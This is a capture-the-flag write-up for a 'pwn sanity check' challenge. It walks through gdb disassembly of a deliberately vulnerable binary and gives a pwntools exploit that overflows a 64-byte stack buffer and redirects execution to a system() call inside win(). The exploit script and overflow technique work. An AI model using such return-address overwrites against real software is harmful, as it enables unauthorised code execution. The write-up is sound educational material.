# Pwn sanity check

Start by running the binary:

```
$ ./pwn_sanity_check         
tell me a joke
knock knock
will this work?
```

It reads our entered data of "knock knock", prints "will this work?" and then
exits. Since it reads user supplied data, perhaps we can force a buffer
overflow?

```
$ python -c "print 'A' * 100" | ./pwn_sanity_check
tell me a joke
will this work?
zsh: done                python -c "print 'A' * 100" | 
zsh: segmentation fault  ./pwn_sanity_check
```

Sweet! Now that we know the code is vulnerable to a buffer overflow, let's
examine it in `gdb` to find what return address to set the instruction pointer
(rip) to.

```
$ gdb -q ./pwn_sanity_check
```

Now enter `disass <tab><tab>` (tab key twice) to view all the functions

```
(gdb) disass <tab><tab>
...truncated...
main	vuln	win	system		shell
...truncated...
```

First, check main:

```
(gdb) disass main
Dump of assembler code for function main:
   0x000000000040078c <+0>:     push   rbp
   0x000000000040078d <+1>:     mov    rbp,rsp
   0x0000000000400790 <+4>:     mov    edi,0xa
   0x0000000000400795 <+9>:     mov    eax,0x0
   0x000000000040079a <+14>:    call   0x400580 <alarm@plt>
   0x000000000040079f <+19>:    mov    eax,0x0
   0x00000000004007a4 <+24>:    call   0x400730 <vuln>
   0x00000000004007a9 <+29>:    mov    eax,0x0
   0x00000000004007ae <+34>:    pop    rbp
   0x00000000004007af <+35>:    ret
```

It sets an alarm that exits the program in 10 (0xa) seconds and calls the vuln
function. 

(Tip: to give yourself more time when debugging you can increase the alarm time
by entering:)

```
(gdb) set $edi=0xffff
```

Now the vuln function:

```
(gdb) disass vuln                                                                                                                                                                                                                          
Dump of assembler code for function vuln: 
   0x0000000000400730 <+0>:     push   rbp    
   0x0000000000400731 <+1>:     mov    rbp,rsp 
   0x0000000000400734 <+4>:     sub    rsp,0x40                                                                      
   0x0000000000400738 <+8>:     lea    rdi,[rip+0x1d1]        # 0x400910                                                              
   0x000000000040073f <+15>:    call   0x400550 <puts@plt>                                                           
   0x0000000000400744 <+20>:    mov    rdx,QWORD PTR [rip+0x200915]        # 0x601060 <stdin@@GLIBC_2.2.5>                            
   0x000000000040074b <+27>:    lea    rax,[rbp-0x40]
   0x000000000040074f <+31>:    mov    esi,0x100
   0x0000000000400754 <+36>:    mov    rdi,rax                                                                       
   0x0000000000400757 <+39>:    call   0x400590 <fgets@plt>          
   0x000000000040075c <+44>:    cmp    DWORD PTR [rbp-0x4],0xdeadc0de                                                                 
   0x0000000000400763 <+51>:    jne    0x40077d <vuln+77>                                                            
   0x0000000000400765 <+53>:    lea    rdi,[rip+0x1b4]        # 0x400920                                                              
   0x000000000040076c <+60>:    call   0x400550 <puts@plt>
   0x0000000000400771 <+65>:    mov    eax,0x0         
   0x0000000000400776 <+70>:    call   0x4006f4 <shell>  
   0x000000000040077b <+75>:    jmp    0x400789 <vuln+89>                                                            
   0x000000000040077d <+77>:    lea    rdi,[rip+0x1c1]        # 0x400945                                                              
   0x0000000000400784 <+84>:    call   0x400550 <puts@plt>         
   0x0000000000400789 <+89>:    nop                                
   0x000000000040078a <+90>:    leave                              
   0x000000000040078b <+91>:    ret
```

On line <+27> we see that 64 bytes (0x40) of stack space are being allocated for
our input buffer. So we can cause a buffer overflow with 72 bytes of data (64
for input buffer + 8 for base pointer).

But where do we set the instruction pointer to return to? Let's check out that
win function we say earlier.

```
(gdb) disass win
Dump of assembler code for function win:
   0x0000000000400697 <+0>:     push   rbp
   0x0000000000400698 <+1>:     mov    rbp,rsp
   0x000000000040069b <+4>:     sub    rsp,0x10
   0x000000000040069f <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x00000000004006a2 <+11>:    mov    DWORD PTR [rbp-0x8],esi
   0x00000000004006a5 <+14>:    lea    rdi,[rip+0x18c]        # 0x400838
   0x00000000004006ac <+21>:    call   0x400550 <puts@plt>
   0x00000000004006b1 <+26>:    cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x00000000004006b8 <+33>:    jne    0x4006f1 <win+90>
   0x00000000004006ba <+35>:    lea    rdi,[rip+0x1b7]        # 0x400878
   0x00000000004006c1 <+42>:    call   0x400550 <puts@plt>
   0x00000000004006c6 <+47>:    cmp    DWORD PTR [rbp-0x8],0x1337c0de
   0x00000000004006cd <+54>:    jne    0x4006f1 <win+90>
   0x00000000004006cf <+56>:    lea    rdi,[rip+0x1b7]        # 0x40088d
   0x00000000004006d6 <+63>:    call   0x400550 <puts@plt>
   0x00000000004006db <+68>:    lea    rdi,[rip+0x1bc]        # 0x40089e
   0x00000000004006e2 <+75>:    call   0x400560 <system@plt>
   0x00000000004006e7 <+80>:    mov    edi,0x0
   0x00000000004006ec <+85>:    call   0x4005a0 <exit@plt>
   0x00000000004006f1 <+90>:    nop
   0x00000000004006f2 <+91>:    leave  
   0x00000000004006f3 <+92>:    ret
```

We *could* return to the starting address of win (0x400697), but then we would
have to pass the comparison checks on lines <+26> and <+47>. We can save
ourselves the headache by jumping closer to the system call. I chose address
0x4006cf.

Here is my python script:

```
#!/usr/bin/env python3
from pwn import *

LOCAL=True

binary = "./pwn_sanity_check"

context.binary = binary

if LOCAL:
	p = process(binary)
else:
	p = remote("dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io", 7480)

# Overflow buffer 
payload = b"A" * 72  		# 60 bytes for buffer, 4 for local integer, and 8 for rbp
payload += p64(0x4006cf)	# bypass parameter checks in win() function

p.readuntil("tell me a joke\n")
p.sendline(payload)

p.interactive()
```
